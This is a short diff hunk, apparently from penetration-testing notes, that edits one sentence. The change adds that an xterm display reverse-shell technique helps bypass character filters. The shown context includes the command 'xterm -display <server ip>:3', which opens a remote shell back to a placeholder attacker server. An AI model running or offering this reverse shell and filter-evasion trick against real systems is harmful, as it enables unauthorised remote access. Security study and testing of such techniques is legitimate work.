@@ -62,5 +62,5 @@ On the remote machine you can then run:
 xterm -display <server ip>:3
 ```
 
-From this you'll receive a reverse shell.
+From this you'll receive a reverse shell.  I've found this useful to bypass certain character filters and if no other option presents itself.
 
